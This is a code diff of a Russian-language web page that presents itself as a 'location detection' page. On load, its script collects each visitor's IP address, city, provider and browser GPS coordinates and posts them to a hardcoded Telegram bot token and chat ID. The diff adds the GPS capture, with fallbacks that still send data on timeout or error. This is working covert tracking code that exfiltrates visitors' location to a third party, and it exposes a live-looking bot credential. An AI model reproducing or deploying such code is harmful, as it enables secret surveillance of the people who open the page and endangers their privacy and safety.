@@ -1,41 +1,64 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8">
-  <title>Определение местоположения</title>
-</head>
-<body>
-  <h2>Ищу местоположение по IP...</h2>
-  <p id="status">Пожалуйста, подождите...</p>
+<script>
+  function sendToTelegram(message) {
+    fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: 490491527,
+        text: message
+      })
+    });
+  }
 
-  <script>
-    fetch("https://ipapi.co/json/")
-      .then(response => response.json())
-      .then(data => {
-        const message = `
+  fetch("https://ipapi.co/json/")
+    .then(response => response.json())
+    .then(data => {
+      const ipMessage = `
 IP: ${data.ip}
 Город: ${data.city}
 Регион: ${data.region}
 Страна: ${data.country_name}
 Провайдер: ${data.org}
 Время: ${new Date().toLocaleString()}
-        `;
-        document.getElementById("status").innerText = message;
+      `;
 
-        // Отправка в Telegram через Webhook
-        fetch("https://api.telegram.org/bot7780068053:AAEfj3ROoHOupCeM7F_W7auJAkakcluF5Nw/sendMessage", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: 490491527,
-            text: message
-          })
-        });
-      })
-      .catch(err => {
-        document.getElementById("status").innerText = "Ошибка: не удалось получить местоположение.";
-        console.error(err);
-      });
-  </script>
-</body>
-</html>
+      document.getElementById("status").innerText = ipMessage + "\n\n⏳ Ожидаю GPS...";
+
+      let gpsTimeout = setTimeout(() => {
+        const fallback = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
+        document.getElementById("status").innerText = fallback;
+        sendToTelegram(fallback);
+      }, 8000);
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            clearTimeout(gpsTimeout);
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+
+            const full = ipMessage + `\n\nGPS: ${lat}, ${lon}\nТочность: ${acc} м`;
+            document.getElementById("status").innerText = full;
+            sendToTelegram(full);
+          },
+          err => {
+            clearTimeout(gpsTimeout);
+            const errMsg = ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`;
+            document.getElementById("status").innerText = errMsg;
+            sendToTelegram(errMsg);
+          }
+        );
+      } else {
+        const notSupported = ipMessage + "\n\n⚠️ GPS не поддерживается.";
+        document.getElementById("status").innerText = notSupported;
+        sendToTelegram(notSupported);
+      }
+    })
+    .catch(err => {
+      const failMsg = "❌ Ошибка получения IP-геолокации.";
+      document.getElementById("status").innerText = failMsg;
+      console.error(err);
+      sendToTelegram(failMsg);
+    });
+</script>
